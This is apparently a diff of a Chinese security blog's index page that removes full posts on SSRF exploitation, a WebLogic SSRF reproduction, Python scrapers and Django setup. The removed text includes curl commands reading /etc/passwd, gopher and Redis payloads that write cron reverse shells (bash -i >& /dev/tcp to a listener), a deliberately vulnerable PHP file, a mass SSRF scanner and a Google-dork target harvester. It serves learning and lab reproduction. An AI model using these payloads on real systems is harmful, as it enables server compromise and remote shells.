@@ -342,63 +342,17 @@
       
         
           
-            <h4 id="什么是-SSRF-？"><a href="#什么是-SSRF-？" class="headerlink" title="什么是 SSRF ？"></a>什么是 SSRF ？</h4><p>简介：SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。<hr></p>
-<h4 id="SSRF危害即可以实现的攻击行为"><a href="#SSRF危害即可以实现的攻击行为" class="headerlink" title="SSRF危害即可以实现的攻击行为"></a>SSRF危害即可以实现的攻击行为</h4><ol>
-<li>主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<code>Banner</code>信息</li>
-<li>攻击运行在内外网主机的应用程序</li>
-<li>通过访问默认文件对内网 <code>Web</code> 应用进行指纹识别</li>
-<li>攻击内外网的 <code>Web</code> 应用，主要是使用 <code>GET</code>参数就可以实现的攻击</li>
-<li>利用<code>file</code>协议读取本地文件</li>
-</ol>
-<p><hr></p>
-<h4 id="可进行利用的协议"><a href="#可进行利用的协议" class="headerlink" title="可进行利用的协议"></a>可进行利用的协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FILE                           读取服务器上任意文件内容</span><br><span class="line">IMAP/IMAPS/POP3SMTP/SMTPS      爆破邮件用户名密码</span><br><span class="line">FTP/FTPS                       FTP匿名访问、爆破</span><br><span class="line">DICT                           操作内网Redis等服务</span><br><span class="line">GOPHER                         能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞</span><br><span class="line">TFTP                           UDP协议扩展</span><br></pre></td></tr></table></figure>
-<p>使用<code>curl -V</code>命令可以查看<code>Ubuntu 16.04</code>版本下默认的<code>libcurl</code>支持的协议</p>
-<h4 id="PHP中容易造成漏洞的函数"><a href="#PHP中容易造成漏洞的函数" class="headerlink" title="PHP中容易造成漏洞的函数"></a>PHP中容易造成漏洞的函数</h4><blockquote>
-<p>curl_exec()<br>file_get_contents()<br>fsockopen()</p>
-</blockquote>
-<p><hr></p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
-<li>本地利用</li>
-</ul>
-<p>利用方式</p>
-<ol>
-<li><p>利用file协议查看文件</p>
-<blockquote>
-<p>curl -v ‘file:///etc/passwd’            </p>
-</blockquote>
-</li>
-<li><p>利用dict探测端口</p>
-<blockquote>
-<p>curl -v ‘dict://127.0.0.1:22’<br>curl -v ‘dict://127.0.0.1:6379/info’</p>
-</blockquote>
-</li>
-<li><p>利用gopher协议反弹shell</p>
-<blockquote>
-<p><code>curl -v &#39;gopher://靶机ip:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;</code></p>
-</blockquote>
-</li>
-</ol>
-<p>更换IP和端口时，命令中的<code>$58</code>也要更改，<code>$58</code>表示字符串长度为58个字节，上面的EXP即是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a</code>，3+51+4=58。如果想换成<code>42.256.24.73</code>，那么<code>$58</code>需要改成<code>$61</code>，以此类推。</p>
-<p>注：Windows下使用<code>curl</code>命令需要把单引号换成双引号</p>
-<ul>
-<li>远程利用</li>
-</ul>
-<p>例 1<br>  <code>ssrf.php</code> （未做任何ssrf防御）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    // 创建一个新cURL资源</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    // 设置URL和相应的选项</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    // 抓取URL并把它传递给浏览器</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    // 关闭cURL资源，并且释放系统资源</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url); </span><br><span class="line">?&gt;</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
-<p><code>$GET_[&#39;url&#39;]</code>可控，从而可以发送任意请求站点，构成<code>ssrf</code>漏洞<br>利用方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议任意文件读取</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># 利用dict协议查看端口</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;</span><br><span class="line"></span><br><span class="line"># 利用gopher协议反弹shell</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure></p>
-<p>例 2<br><code>ssrf2.php</code><br>    限制协议为HTTP、HTTPS<br>    设置跳转重定向为True（默认不跳转）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">    // 限制为HTTPS、HTTP协议</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>此时使用<code>dict</code>协议已经不成功，可以利用<code>302跳转</code>的方式来绕过http协议限制</p>
-<p><hr></p>
-<h4 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h4><ol>
-<li>限制协议为HTTP、HTTPS</li>
-<li>限制302跳转次数</li>
-<li>统一错误信息</li>
-<li>限制内网IP</li>
-</ol>
-<hr>
-
-<p>参考链接：<br><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a><br><a href="http://www.mottoin.com/tech/115007.html" target="_blank" rel="noopener">http://www.mottoin.com/tech/115007.html</a><br><a href="https://feei.cn/ssrf" target="_blank" rel="noopener">https://feei.cn/ssrf</a></p>
-
-          
+          什么是 SSRF ？简介：SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。
+SSRF危害即可以实现的攻击行为
+主机本地敏感信息读取， 对外网、服务器所在内
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/SSRF漏洞学习/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -538,178 +492,22 @@
       
         
           
-            <h5 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h5><ul>
-<li><p>bs4参考链接：<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html</a></p>
-</li>
-<li><p>实例1：利用百度搜索接口，编写url采集器</p>
-<pre><code>import requests
-from bs4 import BeautifulSoup
+          爬虫
+bs4参考链接：https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html
 
-headers={&apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&apos;}
-
-for i in range(1,100,10):
-    bd_search=&quot;https://www.baidu.com/s?wd=inurl:/dede/login.php?&amp;pn=%s&quot; %str(i)
-    r=requests.get(bd_search,headers=headers)
-    soup=BeautifulSoup(r.text,&quot;lxml&quot;)
-    url_list=soup.select(&quot;.t &gt; a&quot;)    # 获得所有class为t的标签
-    for url in url_list:
-        real_url=url[&quot;href&quot;]
-        r=requests.get(real_url)
-        print (r.url)
-</code></pre></li>
-<li><p>实例2： 爬取文章标题</p>
-<pre><code>import requests
-import re
-
-def get_article():
-    for x in range(1,59):
-        url=&quot;http://zone.secevery.com/sort_ytpe-new__day-0__is_recommend-0_page-&quot;
-        url=url+str(x)
-        resp=requests.get(url)
-        result=re.findall(br&apos;&lt;a href=&quot;http://zone.secevery.com/article/\d+&quot;&gt;(.*?)&lt;/a&gt;&apos;,resp.content)
-        for article in result:
-            print (article.decode(&apos;utf-8&apos;))
-
-if __name__==&apos;__main__&apos;:
-    get_article()
-</code></pre></li>
-<li><p>实例3： 爬取文章标题并写入文件</p>
-<pre><code>#-*-coding UTF_8 -*-
+实例1：利用百度搜索接口，编写url采集器
 import requests
-import re
 from bs4 import BeautifulSoup
 
-headers={
-    &apos;Host&apos;: &quot;zone.secevery.com&quot;,
-    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;,
-    &apos;Referer&apos;:&apos;https://www.baidu.com&apos;
-}
-
-def get_total_pages():
-    url=&apos;http://zone.secevery.com/&apos;
-    response=requests.get(url=url,headers=headers)
-    soup=BeautifulSoup(response.content,&apos;html.parser&apos;)
-
-    a=soup.find_all(&apos;a&apos;,href=re.compile(&apos;is_recommend-0__page-&apos;))
-    a=str(a[-1])
-    total_pages=a.split(&apos;-&apos;)[-1].split(&apos;&quot;&apos;)[0]
-    return  total_pages
-
-def get_total_titles(pages):
-    titles=[]
-    total_pages=int(pages)
-    for page in range(1,int(total_pages)):
-        url=&apos;http://zone.secevery.com/sort_type-new__day-0__is_recommend-0__page-%d&apos;%page
-        resp=requests.get(url=url,headers=headers)
-        soup=BeautifulSoup(resp.content,&apos;html.parser&apos;)
-        a = soup.find_all(&apos;a&apos;,href=re.compile(r&apos;com/article&apos;))
-        for i in a:
-            if i.string != &quot;查看全部&quot;:
-                titles.append(i.string)
-    return titles
-
-def write_txt(titles):
-    with open(&apos;title1.txt&apos;,&apos;w&apos;) as f:
-        for title in titles:
-            f.write(title+&apos;\n&apos;)
-
-if __name__==&apos;__main__&apos;:
-    print(&apos;-&apos;*60)
-    print(&quot;程序启动中......&quot;)
-    print(&apos;-&apos;*60)
-    pages=get_total_pages()
-    print(&quot;总页数为：%s&quot; % pages)
-    print(&apos;-&apos;*60)
-    print(&quot;正在获取数据，请稍后....&quot;)
-    titles=get_total_titles(pages)
-    print(&apos;文件正在写入,请稍后...&apos;)
-    print(&apos;-&apos;*60)
-    write_txt(titles)
-    print(&quot;well done!&quot;)
-</code></pre></li>
-<li><p>实例4：爬取补天公益SRC链接</p>
-<pre><code>import requests
-from requests.packages import urllib3
-from bs4 import BeautifulSoup
-# 项目大厅链接
-# https://butian.360.cn/Reward/plan
-
-# 厂商提交漏洞的链接
-# https://butian.360.cn/Loo/submit?cid=61101
-
-headers={
-    &quot;Host&quot;: &quot;butian.360.cn&quot;,
-    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;,
-    &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,
-    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,
-    &quot;Referer&quot;: &quot;https://butian.360.cn/Reward/plan&quot;,
-    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,
-    &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
-    &quot;Content-Length&quot;: &quot;14&quot;,
-    &quot;Cookie&quot;: &quot;test_cookie_enable=null; __huid=108OHneOmn%2FGBQ%2BJukK2rK3j4HhKMHdLMfd%2BokoEYRQKE%3D; __guid=91251416.1657029331559520500.1512282503171.2822; __DC_gid=90162694.998847747.1523438745794.1537231453981.287; smidV2=201804121919226e10578a54cc4cce100543952a4e7b000018db7a8e1407320; Q=u%3D360H2620192781%26n%3D%26le%3D%26m%3DZGHlWGWOWGWOWGWOWGWOWGWOZwHm%26qid%3D2620192781%26im%3D1_t0105d6cf9b508f72c8%26src%3Dpcw_webscan%26t%3D1; T=s%3D8b8f0bc6b26203525eb9f114ee626b0e%26t%3D1536202563%26lm%3D%26lf%3D2%26sk%3Daa11fbae76d233eeabdcbbb8abdf885b%26mt%3D1536202563%26rc%3D%26v%3D2.0%26a%3D1; __gid=67796994.160790607.1526525535847.1528973038214.14; UM_distinctid=1636c03266b578-07963af4955a558-4c312a7a-144000-1636c03266c426; __DC_monitor_count=20; PHPSESSID=ingp9jlm0d9v5tosb2do8bs8u7; __q__=1537231281479; test_cookie_enable=null; __DC_sid=138613664.439132718304839230.1537229417384.1438; wzwsconfirm=732968041ce27324ddd8dcf54d958661; wzwstemplate=Mw==; wzwschallenge=-1; ccpassport=5a26b60aa93bd3303aea3061a756590d; wzwsvtime=1537230292&quot;,
-}
-
-data={
-    &quot;s&quot;:&quot;1&quot;,
-    &quot;p&quot;:&quot;1&quot;,
-    &quot;token&quot;:&quot;&quot;,
-    &quot;sort&quot;:&quot;1&quot;
-}
-
-urllib3.disable_warnings()    # 消除警告
-
-#获取厂商总页数
-def get_total_pages():
-    url=&quot;https://butian.360.cn/Reward/pub&quot;
-    resp=requests.post(url=url,headers=headers,data=data,verify=False)
-    company_info=resp.json()
-    total_pages=company_info[&apos;data&apos;][&apos;count&apos;]
-    return total_pages
-
-#获取厂商ID
-def get_all_company_id(total_pages):
-    company_id=[]
-    for x in range(1,int(total_pages)+1):
-        print (&quot;正在获取第%d页列表&quot; %x)
-        data[&apos;p&apos;]=x
-        url=&quot;https://butian.360.cn/Reward/pub&quot;
-        resp=requests.post(url=url,headers=headers,data=data,verify=False)
-        info=resp.json()
-        company_info=info[&apos;data&apos;][&apos;list&apos;]
-        for company in company_info:
-            company_id.append(company[&apos;company_id&apos;])
-    return company_id
-
-# 获取厂商域名
-def get_all_company_host(company_id):
-    hosts=[]
-    print (&quot;正在获取域名，请稍后&quot;)
-    for x in company_id:
-        url=&quot;https://butian.360.cn/Loo/submit?cid=%d&quot; % int(x)
-        resp=requests.get(url=url,headers=headers,data=data,verify=False)
-        soup=BeautifulSoup(resp.content,&quot;html.parser&quot;)
-        inp=soup.find_all(&apos;input&apos;)
-        print (inp[4][&apos;value&apos;])
-        hosts.append(inp[4][&apos;value&apos;])
-    return hosts
-
-# 写入txt文件
-def write(hosts):
-    with open(&apos;butian_spider.text&apos;,&apos;w&apos;) as f:
-        for url in hosts:
-            f.write(url+&apos;\n&apos;)
-
-if __name__==&quot;__main__&quot;:
-    total_pages=get_total_pages()
-    company_id=get_all_company_id(total_pages)
-    hosts=get_all_company_host(company_id)
-    print (&quot;正在写入文件&quot;)
-    write(hosts)
-    print (&quot;成功写入&quot;)
-</code></pre></li>
-</ul>
-
-          
+h
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/Python3-学习（爬虫实例）/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -849,48 +647,20 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <p>关于SSRF漏洞的原理以及利用已经记录过了，可以访问<a href="https://www.jianshu.com/p/6bf7700139fa查看，这次复现一下这个漏洞" target="_blank" rel="noopener">https://www.jianshu.com/p/6bf7700139fa查看，这次复现一下这个漏洞</a></p>
-<p>本次还是利用<code>vulhub</code>进行漏洞复现<hr></p>
-<h4 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h4><blockquote>
-<p>docker-compose build<br>docker-compose up -d</p>
-</blockquote>
-<p>访问<code>http://本地ip:7001/uddiexplorer/</code>，即可查看uddiexplorer应用<br><img src="https://upload-images.jianshu.io/upload_images/12585049-68bb4fd2fdf2f855.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<hr>
+          关于SSRF漏洞的原理以及利用已经记录过了，可以访问https://www.jianshu.com/p/6bf7700139fa查看，这次复现一下这个漏洞
+本次还是利用vulhub进行漏洞复现
+测试环境搭建
+docker-compose builddocker-compose up -d
 
-<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，提交参数值为<code>url:port</code>，根据返回错误不同，可对内网状态进行探测如端口开放状态等</p>
-<ol>
-<li><p>访问一个可以访问的<code>ip:port</code>，一般返回一个状态码，<code>The server at http://192.168.60.168:7001/ returned a 404 error code &amp;#40;Not Found&amp;#41;</code>如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-db3ef399b2fe3e0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-</li>
-<li><p>访问一个不存在的端口，将返回<code>but could not connect over HTTP to server</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-ce451d10f52c5637.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-</li>
-<li>访问一个非http协议，则返回<code>did not have a valid SOAP content-type</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-61d8b9048224b849.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><hr>
-
-
-</li>
-</ol>
-<h4 id="注入HTTP头，利用Redis的反弹shell"><a href="#注入HTTP头，利用Redis的反弹shell" class="headerlink" title="注入HTTP头，利用Redis的反弹shell"></a>注入HTTP头，利用Redis的反弹shell</h4><p>通过SSRF探测内网中的Redis的服务器，如图，<code>172.18.0.2:6379</code>可以连通<br><img src="https://upload-images.jianshu.io/upload_images/12585049-61d8b9048224b849.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>发送三条Redis的命令，将反弹<code>shell</code>脚本写入<code>/etc/crontab</code></p>
-<blockquote>
-<p>set 1 “\n\n\n\n<em> </em> <em> </em> * root bash -i &gt;&amp; /dev/tcp/监听ip/port 0&gt;&amp;1\n\n\n\n”<br>config set dir /etc/<br>config set dbfilename crontab<br>save</p>
-</blockquote>
-<p>对命令进行URL编码：</p>
-<blockquote>
-<p>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn<em>%20</em>%20<em>%20</em>%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<code>监听ip</code>%2F<code>Port</code>%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D</p>
-</blockquote>
-<p>攻击机开启监听，将URL编码后的字符串放在SSRF的域名后面发送，成功反弹shell<br><img src="https://upload-images.jianshu.io/upload_images/12585049-094f19d1f8faf3c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
-<p>补充：</p>
-<ul>
-<li>/ etc / crontab这个是肯定的</li>
-<li>/etc/cron.d/*将任意文件写到该目录下，效果和crontab相同，格式也要和/ etc / crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行反弹。</li>
-<li>/ var / spool / cron / root centos系统下root用户的cron文件</li>
-<li>/ var / spool / cron / crontabs / root debian系统下root用户的cron文件</li>
-</ul>
-<hr>
-
-<p>附上大佬<code>weblogic ssrf</code>检测脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import Queue</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line">class Weblogic_SSRF_Check(threading.Thread):</span><br><span class="line">    &quot;&quot;&quot;docstring for Weblogic_SSRF_Check&quot;&quot;&quot;</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line"></span><br><span class="line">    def check(self,domain,ip):</span><br><span class="line">        payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator=&#123;ip&#125;&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip)</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line"></span><br><span class="line">            m = re.search(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                mutex.acquire()</span><br><span class="line">                with open(&apos;ssrf.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">                    print &quot;%s has weblogic ssrf.&quot; % domain</span><br><span class="line">                    f.write(&quot;%s has weblogic ssrf.\n&quot; % domain)</span><br><span class="line">                mutex.release()</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def get_registry(self,domain):</span><br><span class="line">        payload = &apos;uddiexplorer/SetupUDDIExplorer.jsp&apos;</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line">            m = re.search(&apos;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                return m.group(1)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.queue.empty():</span><br><span class="line">            domain = self.queue.get()</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            print domain</span><br><span class="line">            mutex.release()</span><br><span class="line">            ip = self.get_registry(domain)</span><br><span class="line">            self.check(domain,ip)</span><br><span class="line"></span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line"># domain.txt 存放要检测的ip</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&apos;domain.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        queue.put(line.strip())</span><br><span class="line"></span><br><span class="line">    for x in xrange(1,50):</span><br><span class="line">        t = Weblogic_SSRF_Check(queue)</span><br><span class="line">        t.setDaemon(True)</span><br><span class="line">        t.start()</span><br><span class="line">    queue.join()</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8bea0efc5ad86b6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
-<p><hr><br>参考链接：<br><a href="http://wyb0.com/posts/weblogic-ssrf-check/" target="_blank" rel="noopener">http://wyb0.com/posts/weblogic-ssrf-check/</a><br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p>
-
-          
+访问ht
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/Weblogic-SSRF-漏洞复现/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1030,72 +800,31 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <h4 id="Django-安装"><a href="#Django-安装" class="headerlink" title="Django 安装"></a>Django 安装</h4><ol>
-<li>安装<blockquote>
-<p>pip install Django==1.10.2</p>
-</blockquote>
-</li>
-<li>查看是否安装成功<blockquote>
-<p>python -m django version</p>
-</blockquote>
-</li>
-<li>创建新项目<blockquote>
-<p>D:\python&gt;django-admin startproject myblog</p>
-</blockquote>
-</li>
-</ol>
-<p>此时自建项目目录生成</p>
-<ul>
-<li><p>目录结构:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">manage.py            与项目进行交互的命令行工具集的入口</span><br><span class="line"></span><br><span class="line">myblog               项目容器，包含项目最基本的一些配置，目录名不建议修改</span><br><span class="line"></span><br><span class="line">__init__.py          python 中声名模块的文件，默认内容为空</span><br><span class="line"></span><br><span class="line">settings.py          项目总配置文件（数据库、Web应用、时间等配置）</span><br><span class="line"></span><br><span class="line">urls.py              url 配置文件</span><br><span class="line"></span><br><span class="line">wsgi.py              python 与web服务器网关接口</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>启动django自带的服务器</p>
-<blockquote>
-<p>python manage.py runserver 【端口】</p>
-</blockquote>
-</li>
-</ul>
